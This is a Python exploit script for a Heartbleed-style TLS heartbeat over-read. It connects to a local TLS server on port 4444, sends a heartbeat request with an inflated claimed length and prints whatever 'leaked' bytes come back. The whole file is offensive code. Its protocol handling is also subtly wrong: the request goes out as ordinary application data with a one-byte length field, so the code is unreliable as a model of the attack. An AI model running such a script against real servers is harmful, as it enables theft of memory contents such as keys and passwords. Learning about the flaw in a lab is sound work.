from OpenSSL import SSL
import socket
import struct
import time
import sys

def create_tls_connection():
    context = SSL.Context(SSL.TLSv1_2_METHOD)
    client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = SSL.Connection(context, client_sock)
    conn.connect(("127.0.0.1", 4444))  # Connect to the TLS server
    conn.set_connect_state()
    conn.do_handshake()  # Perform full TLS handshake
    return conn

def run_exploit(claimed_payload_length):
    conn = create_tls_connection()

    # Construct the Heartbeat request: type (1) + claimed payload length.
    heartbeat_type = 1
    heartbeat_request = struct.pack("!BB", heartbeat_type, claimed_payload_length)
    
    print(f"Sending Heartbeat request with claimed payload length: {claimed_payload_length}")
    
    # Measure response time.
    start_time = time.time()
    conn.send(heartbeat_request)
    response = conn.recv(4096)
    end_time = time.time()
    elapsed_time = end_time - start_time
    
    if len(response) < 2:
        print("Invalid response received.")
        return
    
    # Unpack response header.
    r_type, r_length = struct.unpack("!BB", response[:2])
    leaked_content = response[2:]
    
    # Display performance and leakage metrics.
    print("Response Heartbeat type:", r_type)
    print("Response claimed payload length:", r_length)
    print("Leaked Data (raw):", leaked_content.decode(errors='ignore'))
    print("Leaked Data Length:", len(leaked_content), "bytes")
    print("Response Time: {:.6f} seconds".format(elapsed_time))
    
    conn.close()

if __name__ == "__main__":
    # Allow varying the claimed payload length via a command-line argument.
    if len(sys.argv) > 1:
        try:
            claimed_length = int(sys.argv[1])
        except ValueError:
            print("Invalid input. Please provide an integer for claimed payload length.")
            sys.exit(1)
    else:
        claimed_length = 64  # Default value
    
    run_exploit(claimed_length)
